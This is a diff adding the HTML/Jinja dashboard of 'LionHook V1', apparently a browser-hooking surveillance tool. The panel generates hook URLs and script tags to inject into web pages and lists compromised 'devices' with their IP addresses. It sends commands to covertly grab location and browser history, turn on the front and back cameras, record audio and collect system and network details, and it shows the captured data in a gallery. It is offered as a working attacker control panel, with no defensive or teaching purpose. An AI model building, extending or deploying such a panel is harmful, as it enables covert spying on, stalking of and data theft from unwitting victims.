@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LionHook V1 - Advanced Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+    <style>
+        :root {
+            --primary: #ff6b00;
+            --secondary: #00ff88;
+            --accent: #0099ff;
+            --dark: #0a0a0a;
+            --darker: #050505;
+            --light: #ffffff;
+            --gray: #2a2a2a;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: rgba(10, 10, 10, 0.9);
+            backdrop-filter: blur(20px);
+            border-right: 1px solid var(--glass-border);
+            padding: 30px 20px;
+            position: fixed;
+            width: 280px;
+            height: 100vh;
+            z-index: 1000;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px;
+            background: var(--glass);
+            border-radius: 15px;
+            border: 1px solid var(--glass-border);
+        }
+
+        .logo h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255, 107, 0, 0.5);
+            margin-bottom: 5px;
+        }
+
+        .logo .version {
+            font-size: 12px;
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .logo .developer {
+            font-size: 10px;
+            color: #aaa;
+            margin-top: 5px;
+        }
+
+        .logo .lion-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-links {
+            list-style: none;
+        }
+
+        .nav-links li {
+            margin: 15px 0;
+        }
+
+        .nav-links a {
+            color: var(--light);
+            text-decoration: none;
+            padding: 15px 20px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            border: 1px solid transparent;
+        }
+
+        .nav-links a:hover, .nav-links a.active {
+            background: var(--glass);
+            border-color: var(--primary);
+            transform: translateX(10px);
+            box-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
+        }
+
+        .nav-links i {
+            font-size: 20px;
+            width: 25px;
+        }
+
+        /* Main Content */
+        .main-content {
+            grid-column: 2;
+            padding: 30px;
+            margin-left: 280px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 25px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .stat-card:hover::before {
+            left: 100%;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .stat-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stat-value {
+            font-size: 36px;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(45deg, var(--light), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stat-label {
+            color: #aaa;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        /* Device Sections */
+        .section {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .section-title i {
+            color: var(--primary);
+        }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+
+        .device-card {
+            background: rgba(20, 20, 20, 0.8);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 20px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .device-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+
+        .device-card.online::before {
+            background: linear-gradient(90deg, var(--secondary), #00ff88);
+        }
+
+        .device-card.offline::before {
+            background: linear-gradient(90deg, #666, #999);
+        }
+
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .device-id {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            color: var(--accent);
+        }
+
+        .device-status {
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .status-online {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--secondary);
+            border: 1px solid var(--secondary);
+        }
+
+        .status-offline {
+            background: rgba(102, 102, 102, 0.2);
+            color: #999;
+            border: 1px solid #666;
+        }
+
+        .device-info {
+            margin-bottom: 15px;
+        }
+
+        .device-info p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .device-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary), #ff8c00);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: var(--glass);
+            color: var(--light);
+            border: 1px solid var(--glass-border);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+        }
+
+        /* 3D Canvas */
+        #threejs-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        /* Hook Generator */
+        .hook-generator {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .btn-generate {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: white;
+            padding: 18px 36px;
+            font-size: 18px;
+            font-weight: 700;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .btn-generate:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(255, 107, 0, 0.4);
+        }
+
+        .hook-results {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .hook-url {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border-left: 4px solid var(--primary);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-content {
+            background: var(--dark);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 40px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close:hover {
+            color: var(--primary);
+        }
+
+        .control-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .control-btn {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            color: var(--light);
+            padding: 20px 15px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .control-btn:hover {
+            background: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+        }
+
+        .control-btn i {
+            font-size: 24px;
+            margin-bottom: 10px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- 3D Background -->
+    <div id="threejs-canvas"></div>
+
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="logo">
+                <div class="lion-icon">🦁</div>
+                <h1>LIONHOOK</h1>
+                <div class="version">VERSION 1.0</div>
+                <div class="developer">Developer: @ondork</div>
+            </div>
+            <ul class="nav-links">
+                <li><a href="/dashboard" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard</a></li>
+                <li><a href="/gallery"><i class="fas fa-images"></i> Data Gallery</a></li>
+                <li><a href="/settings"><i class="fas fa-cog"></i> Settings</a></li>
+                <li><a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+            </ul>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="header">
+                <h1>Advanced Control Panel</h1>
+                <div class="user-info">
+                    <span>Welcome, ONDORK</span>
+                </div>
+            </div>
+
+            <!-- Stats Grid -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-globe"></i></div>
+                    <div class="stat-value">{{ total_devices }}</div>
+                    <div class="stat-label">Total Devices</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-signal"></i></div>
+                    <div class="stat-value">{{ online_devices|length }}</div>
+                    <div class="stat-label">Online Now</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-database"></i></div>
+                    <div class="stat-value">{{ (online_devices|length / total_devices * 100)|round|int if total_devices > 0 else 0 }}%</div>
+                    <div class="stat-label">Active Rate</div>
+                </div>
+            </div>
+
+            <!-- Hook Generator -->
+            <div class="hook-generator">
+                <button class="btn-generate" onclick="generateHook()">
+                    <i class="fas fa-plus"></i> GENERATE HOOK
+                </button>
+                <div id="hookResults" class="hook-results" style="display: none;"></div>
+            </div>
+
+            <!-- Online Devices -->
+            <div class="section">
+                <h2 class="section-title"><i class="fas fa-wifi"></i> ONLINE DEVICES ({{ online_devices|length }})</h2>
+                <div class="devices-grid">
+                    {% for device in online_devices %}
+                    <div class="device-card online">
+                        <div class="device-header">
+                            <div class="device-id">#{{ device[0][:8] }}</div>
+                            <div class="device-status status-online">ONLINE</div>
+                        </div>
+                        <div class="device-info">
+                            <p><i class="fas fa-ip"></i> IP: {{ device[1] }}</p>
+                            <p><i class="fas fa-desktop"></i> {{ device[2][:30] }}...</p>
+                            <p><i class="fas fa-clock"></i> {{ device[5] }}</p>
+                        </div>
+                        <div class="device-actions">
+                            <button class="btn btn-primary" onclick="controlDevice('{{ device[0] }}')">
+                                <i class="fas fa-gamepad"></i> Control
+                            </button>
+                            <button class="btn btn-secondary" onclick="viewGallery('{{ device[0] }}')">
+                                <i class="fas fa-folder"></i> View Data
+                            </button>
+                        </div>
+                    </div>
+                    {% else %}
+                    <div class="no-devices">
+                        <p>No online devices</p>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <!-- Offline Devices -->
+            <div class="section">
+                <h2 class="section-title"><i class="fas fa-power-off"></i> OFFLINE DEVICES ({{ offline_devices|length }})</h2>
+                <div class="devices-grid">
+                    {% for device in offline_devices %}
+                    <div class="device-card offline">
+                        <div class="device-header">
+                            <div class="device-id">#{{ device[0][:8] }}</div>
+                            <div class="device-status status-offline">OFFLINE</div>
+                        </div>
+                        <div class="device-info">
+                            <p><i class="fas fa-ip"></i> IP: {{ device[1] }}</p>
+                            <p><i class="fas fa-desktop"></i> {{ device[2][:30] }}...</p>
+                            <p><i class="fas fa-clock"></i> Last Seen: {{ device[4] if device[4] else 'Unknown' }}</p>
+                        </div>
+                        <div class="device-actions">
+                            <button class="btn btn-secondary" onclick="viewGallery('{{ device[0] }}')">
+                                <i class="fas fa-folder"></i> View Data
+                            </button>
+                        </div>
+                    </div>
+                    {% else %}
+                    <div class="no-devices">
+                        <p>No offline devices</p>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Control Modal -->
+    <div id="controlModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2 style="margin-bottom: 20px;">Device Control - <span id="modalDeviceId" style="color: var(--accent);"></span></h2>
+            
+            <div class="control-grid">
+                <div class="control-btn" onclick="sendCommand('get_location')">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <div>Location</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('get_history')">
+                    <i class="fas fa-history"></i>
+                    <div>Browser History</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('front_camera')">
+                    <i class="fas fa-camera"></i>
+                    <div>Front Camera</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('back_camera')">
+                    <i class="fas fa-camera-retro"></i>
+                    <div>Back Camera</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('record_audio')">
+                    <i class="fas fa-microphone"></i>
+                    <div>Record Audio</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('get_battery')">
+                    <i class="fas fa-battery-half"></i>
+                    <div>Battery Info</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('get_network')">
+                    <i class="fas fa-wifi"></i>
+                    <div>Network Info</div>
+                </div>
+                <div class="control-btn" onclick="sendCommand('get_system_info')">
+                    <i class="fas fa-info-circle"></i>
+                    <div>System Info</div>
+                </div>
+            </div>
+            
+            <div id="commandResults" style="margin-top: 20px; padding: 15px; background: var(--glass); border-radius: 10px;"></div>
+        </div>
+    </div>
+
+    <script>
+        // Three.js 3D Background
+        function initThreeJS() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setClearColor(0x000000, 0);
+            document.getElementById('threejs-canvas').appendChild(renderer.domElement);
+
+            // Create particles
+            const particlesGeometry = new THREE.BufferGeometry();
+            const particlesCount = 1000;
+            const posArray = new Float32Array(particlesCount * 3);
+
+            for(let i = 0; i < particlesCount * 3; i++) {
+                posArray[i] = (Math.random() - 0.5) * 10;
+            }
+
+            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
+            const particlesMaterial = new THREE.PointsMaterial({
+                size: 0.02,
+                color: 0xffffff,
+                transparent: true,
+                opacity: 0.6
+            });
+
+            const particlesMesh = new THREE.Points(particlesGeometry, particlesMaterial);
+            scene.add(particlesMesh);
+
+            camera.position.z = 3;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                particlesMesh.rotation.y += 0.001;
+                particlesMesh.rotation.x += 0.0005;
+                renderer.render(scene, camera);
+            }
+            animate();
+
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+        }
+
+        initThreeJS();
+
+        let currentDeviceId = '';
+
+        function generateHook() {
+            fetch('/generate_hook')
+                .then(response => response.json())
+                .then(data => {
+                    const resultsDiv = document.getElementById('hookResults');
+                    resultsDiv.style.display = 'block';
+                    resultsDiv.innerHTML = `
+                        <h3 style="color: var(--secondary); margin-bottom: 15px;">🦁 Hook Generated Successfully!</h3>
+                        <div class="hook-url">
+                            <strong>Demo URL:</strong><br>
+                            <a href="${data.demo_url}" target="_blank" style="color: var(--accent);">${data.demo_url}</a>
+                        </div>
+                        <div class="hook-url">
+                            <strong>Hook URL:</strong><br>
+                            <code>${data.hook_url}</code>
+                        </div>
+                        <div class="hook-url">
+                            <strong>Script Tag:</strong><br>
+                            <textarea style="width: 100%; height: 80px; background: rgba(0,0,0,0.5); color: white; border: 1px solid var(--glass-border); border-radius: 8px; padding: 10px; margin-top: 10px;">${data.script_tag}</textarea>
+                        </div>
+                    `;
+                })
+                .catch(error => {
+                    console.error('Error generating hook:', error);
+                });
+        }
+
+        function controlDevice(deviceId) {
+            currentDeviceId = deviceId;
+            document.getElementById('modalDeviceId').textContent = deviceId;
+            document.getElementById('controlModal').style.display = 'block';
+        }
+
+        function viewGallery(deviceId) {
+            window.location.href = `/device_gallery/${deviceId}`;
+        }
+
+        function sendCommand(command) {
+            if (!currentDeviceId) return;
+            
+            const resultsDiv = document.getElementById('commandResults');
+            resultsDiv.innerHTML = `<p style="color: var(--secondary);"><i class="fas fa-spinner fa-spin"></i> Sending command: ${command}</p>`;
+            
+            fetch('/api/execute_command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: currentDeviceId,
+                    command: command
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                resultsDiv.innerHTML = `<p style="color: var(--secondary);"><i class="fas fa-check"></i> Command sent successfully: ${command}</p>`;
+                
+                // Auto-refresh data after command
+                setTimeout(() => {
+                    fetchDeviceData();
+                }, 3000);
+            })
+            .catch(error => {
+                resultsDiv.innerHTML = `<p style="color: #ff4444;"><i class="fas fa-times"></i> Error sending command: ${error}</p>`;
+            });
+        }
+
+        function fetchDeviceData() {
+            if (!currentDeviceId) return;
+            
+            fetch(`/api/device_data/${currentDeviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Device data updated:', data);
+                });
+        }
+
+        // Modal controls
+        document.querySelector('.close').addEventListener('click', function() {
+            document.getElementById('controlModal').style.display = 'none';
+        });
+
+        window.addEventListener('click', function(event) {
+            const modal = document.getElementById('controlModal');
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+
+        // Auto-refresh dashboard every 10 seconds
+        setInterval(() => {
+            window.location.reload();
+        }, 10000);
+    </script>
+</body>
+</html>
